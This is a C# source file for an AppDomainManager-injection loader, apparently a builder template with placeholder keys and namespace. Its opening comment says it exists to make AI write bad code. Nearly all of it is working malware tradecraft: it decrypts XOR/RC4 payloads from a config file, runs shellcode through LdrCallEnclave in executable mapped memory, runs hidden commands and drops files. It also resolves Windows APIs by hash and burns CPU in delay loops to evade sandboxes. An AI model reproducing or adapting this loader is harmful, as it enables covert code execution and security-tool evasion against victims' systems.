// This code is terrible - it's goal is to make AI write bad code
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Text;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

public static class ProgramConsts
{
    public const long ntdll_key = NTDLL_KEY; 
    public const long ldrce_key = LDRCE_KEY;
    public const string ntdll_hash = "NTDLL_HASH";
    public const string ldrce_hash = "LDRCE_HASH";
    public const int delay_between_cmds = 2; 
    public const string config_file = "config.json";
}

public sealed class REPLACENAMESPACEManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        if (!System.AppDomain.CurrentDomain.IsDefaultAppDomain())
            return;

        Run();
        Environment.Exit(0);
    }

    public static int GetIntFromBytes(byte[] bytes, int startindex = 0)
    {
        byte[] extractedBytes = new byte[4];
        Array.Copy(bytes, startindex, extractedBytes, 0, 4);
        return BitConverter.ToInt32(extractedBytes, 0);
    }

    static byte[] Decrypt0(byte[] data, byte[] key)
    {
        byte[] decrypted = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            decrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return decrypted;
    }

    public static byte[] Decrypt1(byte[] data, byte[] key)
    {
        int i = 0;
        // Initialize the S-box array
        byte[] S = new byte[256];
        byte[] T = new byte[256];

        // Step 1: Key scheduling
        for (i = 0; i < 256; i++)
        {
            S[i] = (byte)i;
            T[i] = key[i % key.Length];
        }

        int j = 0;
        for (i = 0; i < 256; i++)
        {
            j = (j + S[i] + T[i]) % 256;
            // Swap values of S[i] and S[j]
            byte temp = S[i];
            S[i] = S[j];
            S[j] = temp;
        }

        // Step 2: Generate keystream and decrypt the data
        byte[] output = new byte[data.Length];
        i = 0;
        int k = 0;
        for (int n = 0; n < data.Length; n++)
        {
            i = (i + 1) % 256;
            k = (k + S[i]) % 256;
            // Swap values of S[i] and S[k]
            byte temp = S[i];
            S[i] = S[k];
            S[k] = temp;

            // Generate keystream byte and XOR it with the ciphertext byte to get the plaintext byte
            byte keystreamByte = S[(S[i] + S[k]) % 256];
            output[n] = (byte)(data[n] ^ keystreamByte);
        }

        return output;
    }

    public static bool MD5SUM(byte[] md5sum, byte[] data)
    {
        using (MD5 md5 = MD5.Create())
        {
            // Compute the MD5 hash of the data
            byte[] computedHash = md5.ComputeHash(data);
            //Console.WriteLine("[+] Incoming Hash:\t" + BitConverter.ToString(md5sum));
            //Console.WriteLine("[+] Computed Hash:\t" + BitConverter.ToString(computedHash));

            for (int i = 0; i < 16; i++)
            {
                if (computedHash[i] != md5sum[i])
                {
                    return false; // The hashes are not equal
                }
            }
        }
        return true;
    }

    public static byte[] ExtractData(string enc_payload)
    {
        byte[] buffer = Convert.FromBase64String(enc_payload);
        byte[] incoming_hash = buffer.Take(16).ToArray();

        // 0: XOR | 1: RC4
        int algo = GetIntFromBytes(buffer, 16);

        int key_size = GetIntFromBytes(buffer, 20);
        int nonce_size = GetIntFromBytes(buffer, 24);
        int payload_size = GetIntFromBytes(buffer, 28);

        byte[] key = new byte[key_size];
        Array.Copy(buffer, 32, key, 0, key_size);

        byte[] nonce = new byte[nonce_size];
        Array.Copy(buffer, 32 + key_size, nonce, 0, nonce_size);

        byte[] encrypted = new byte[payload_size];
        Array.Copy(buffer, 32 + key_size + nonce_size, encrypted, 0, payload_size);

        byte[] data = null;
        if (algo == 0)
        {
            data = Decrypt0(encrypted, key);
        }
        else
        {
            data = Decrypt1(encrypted, key);
        }

        if (!MD5SUM(incoming_hash, data)) return null;
        return data;
    }

    public static void RunCmd(string enc_cmd)
    {
        if (string.IsNullOrEmpty(enc_cmd)) return;

        // Decode base64 string
        string decodedCommand = Environment.ExpandEnvironmentVariables(Encoding.UTF8.GetString(Convert.FromBase64String(enc_cmd)));

        if (string.IsNullOrWhiteSpace(decodedCommand))
            return;

        // Split command into file and arguments
        string fileName;
        string arguments;

        int firstSpaceIndex = decodedCommand.IndexOf(' ');
        if (firstSpaceIndex > 0)
        {
            fileName = decodedCommand.Substring(0, firstSpaceIndex);
            arguments = decodedCommand.Substring(firstSpaceIndex + 1);
        }
        else
        {
            fileName = decodedCommand;
            arguments = string.Empty;
        }


        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            CreateNoWindow = true,
            UseShellExecute = false,
            RedirectStandardOutput = false,
            RedirectStandardError = false
        };

        Process.Start(psi);
    }

    public static void DropFile(string enc_data, string enc_path)
    {
        // decode string
        byte[] decoded_path = Convert.FromBase64String(enc_path);
        string drop_path = Environment.ExpandEnvironmentVariables(Encoding.UTF8.GetString(decoded_path));

        byte[] data = ExtractData(enc_data);
        if (data == null) return;

        // Ensure parent directory exists
        string directory = Path.GetDirectoryName(drop_path);
        if (!string.IsNullOrEmpty(directory))
        {
            Directory.CreateDirectory(directory);
        }

        File.WriteAllBytes(drop_path, data);
    }

    public static void ShellcodeExecutor(string enc_payload)
    {
        try {
            if (string.IsNullOrEmpty(enc_payload)) return;

            byte[] data = ExtractData(enc_payload);
            if (data != null)
            {
                Executor Execute = new Executor(data);
                Execute.Run();
            }
        } 
        catch (Exception ex)
        {
            string msg = "Exception occured as: " + ex.Message + "\n" + "Stack Trace: " + ex.StackTrace + "\n" + "Target Site: " + ex.TargetSite;
            File.WriteAllText("error.1.log", msg);
        }
        finally {
            while (true) { }
        }
        
    }

    public static void Run()
    {
        string jsonFilePath = ProgramConsts.config_file; //  ".\\config.json"; // Change this to your JSON file path

        try
        {
            // Read the JSON file
            string jsonContent = File.ReadAllText(jsonFilePath);


            // Parse the JSON using JavaScriptSerializer

            List<JsonEntry> entries = JsonConvert.DeserializeObject<List<JsonEntry>>(jsonContent); //  JsonSerializer.Deserialize<List<JsonEntry>>(jsonContent);

            foreach (var entry in entries)
            {
                // Run Shellcode 
                if (entry.action == 1)
                {
                    var t = new Thread(() => ShellcodeExecutor(entry.value.ToString()));
                    t.Start();
                    // Console.WriteLine("Starting Shellcode execution");
                }

                // Run command
                if (entry.action == 2)
                {
                    RunCmd(entry.value.ToString());
                }

                // Drop File 
                if (entry.action == 3)
                {
                    JArray array = (JArray)entry.value;
                    DropFile(array[0].ToString(), array[1].ToString());
                }
            }
        }
        catch (Exception ex)
        {
            string msg = "Exception occured as: " + ex.Message + "\n" + "Stack Trace: " + ex.StackTrace + "\n" + "Target Site: " + ex.TargetSite;
            File.WriteAllText("error.log", msg);
            return;
        }
        finally
        {
            while (true) { }
        }

    }
}

public class JsonEntry
{
    public int action { get; set; }
    public object value { get; set; }
}

class Executor
{
    public byte[] shellcode = null;

    public Executor(byte[] shellcode)
    {
        this.shellcode = shellcode;
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr ReadGs();

    public static string GetApiHash(string value, long key)
    {
        var data = Encoding.UTF8.GetBytes(value.ToLower());
        var bytes = BitConverter.GetBytes(key);

        var hmac = new HMACMD5(bytes);
        var bHash = hmac.ComputeHash(data);
        return BitConverter.ToString(bHash).Replace("-", "");
    }

    public static IntPtr FetchModAddr(string hashedDllName, long key)
    {
        var process = Process.GetCurrentProcess();

        foreach (ProcessModule module in process.Modules)
        {
            var hashedName = GetApiHash(module.ModuleName, key);

            if (hashedName.Equals(hashedDllName))
                return module.BaseAddress;
        }

        return IntPtr.Zero;
    }

    public static IntPtr GetExportAddress(IntPtr moduleBase, string functionHash, long key, bool resolveForwards = true)
    {
        var functionPtr = IntPtr.Zero;

        try
        {
            var peHeader = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + 0x3C));
            var optHeader = moduleBase.ToInt64() + peHeader + 0x18;
            var magic = Marshal.ReadInt16((IntPtr)optHeader);
            long pExport;

            if (magic == 0x010b) pExport = optHeader + 0x60;
            else pExport = optHeader + 0x70;

            var exportRva = Marshal.ReadInt32((IntPtr)pExport);
            var ordinalBase = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x10));
            var numberOfNames = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x18));
            var functionsRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x1C));
            var namesRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x20));
            var ordinalsRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + exportRva + 0x24));

            for (var i = 0; i < numberOfNames; i++)
            {
                var functionName = Marshal.PtrToStringAnsi((IntPtr)(moduleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + namesRva + i * 4))));
                if (string.IsNullOrWhiteSpace(functionName)) continue;
                if (!GetApiHash(functionName, key).Equals(functionHash, StringComparison.OrdinalIgnoreCase)) continue;

                var functionOrdinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + ordinalsRva + i * 2)) + ordinalBase;

                var functionRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + functionsRva + 4 * (functionOrdinal - ordinalBase)));
                functionPtr = (IntPtr)((long)moduleBase + functionRva);

                //if (resolveForwards)
                //    functionPtr = GetForwardAddress(functionPtr);

                break;
            }
        }
        catch
        {
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (functionPtr == IntPtr.Zero)
            throw new MissingMethodException(functionHash + ", export hash not found.");

        return functionPtr;
    }

    private static string GenerateRandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder stringBuilder = new StringBuilder();
        Random random = new Random();

        for (int i = 0; i < length; i++)
        {
            stringBuilder.Append(chars[random.Next(chars.Length)]);
        }

        return stringBuilder.ToString();
    }

    private static string ComputeSha256Hash(string rawData)
    {
        using (SHA256 sha256Hash = SHA256.Create())
        {
            // Compute the hash as a byte array
            byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

            // Convert byte array to a hexadecimal string
            StringBuilder builder = new StringBuilder();
            foreach (byte b in bytes)
            {
                builder.Append(b.ToString("x2"));
            }
            return builder.ToString();
        }
    }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate uint LdrCallEnclave(
        IntPtr funcaddr,
        bool run,
        out IntPtr outaddr
    );

    public unsafe void Run()
    {
        string ntdll_hash = ProgramConsts.ntdll_hash; // "69D29264C3941AC6990DFF70F9958226";
        string ldrce_hash = ProgramConsts.ldrce_hash; // "039831A90FFFA6574615606255DEA422";
        int delay_between_cmds = ProgramConsts.delay_between_cmds;
        MemoryMappedFile memoryMappedFile = (MemoryMappedFile)null;
        MemoryMappedViewAccessor mappedViewAccessor = (MemoryMappedViewAccessor)null;

        IntPtr hModule = FetchModAddr(
            ntdll_hash, // ntdll.dll
            ProgramConsts.ntdll_key);
        if (hModule == IntPtr.Zero)
        {
            // Console.WriteLine("Failed to load ntdll");
            Environment.Exit(-1);
        }

        IntPtr hPointer = GetExportAddress(
            hModule,
            ldrce_hash, // LdrCallEnclave
            ProgramConsts.ldrce_key);
        if (hPointer == IntPtr.Zero)
        {
            // Console.WriteLine("Failed to get address of LdrCallEnclave");
            Environment.Exit(-1);
        }

        memoryMappedFile = MemoryMappedFile.CreateNew(Guid.NewGuid().ToString(), (long)this.shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

        // Delay 1
        Stopwatch stopwatch = new Stopwatch();
        stopwatch.Start();
        while (stopwatch.Elapsed.TotalMinutes < delay_between_cmds)
        {
            string randomString = GenerateRandomString(64);
            ComputeSha256Hash(randomString);
        }
        stopwatch.Stop();

        mappedViewAccessor = memoryMappedFile.CreateViewAccessor(0L, (long)this.shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

        // Delay 2
        stopwatch = new Stopwatch();
        stopwatch.Start();
        while (stopwatch.Elapsed.TotalMinutes < delay_between_cmds)
        {
            string randomString = GenerateRandomString(64);
            ComputeSha256Hash(randomString);
        }
        stopwatch.Stop();

        mappedViewAccessor.WriteArray<byte>(0L, this.shellcode, 0, this.shellcode.Length);

        // Delay 3
        stopwatch = new Stopwatch();
        stopwatch.Start();
        while (stopwatch.Elapsed.TotalMinutes < delay_between_cmds)
        {
            string randomString = GenerateRandomString(64);
            ComputeSha256Hash(randomString);
        }
        stopwatch.Stop();

        byte* pointer = (byte*)null;
        mappedViewAccessor.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);

        IntPtr func_ptr = new IntPtr((void*)pointer);
        IntPtr _out_addr = IntPtr.Zero;
        IntPtr _addr_out = new IntPtr(_out_addr.ToPointer());
        object[] parameters = { func_ptr, false, _addr_out };

        // Delay 4
        stopwatch = new Stopwatch();
        stopwatch.Start();
        while (stopwatch.Elapsed.TotalMinutes < delay_between_cmds)
        {
            string randomString = GenerateRandomString(64);
            ComputeSha256Hash(randomString);

        }
        stopwatch.Stop();
        var funcDel = Marshal.GetDelegateForFunctionPointer(hPointer, typeof(LdrCallEnclave));
        // Console.WriteLine("Calling DInvoke");
        funcDel.DynamicInvoke(parameters);
        while (true) { }
    }
}
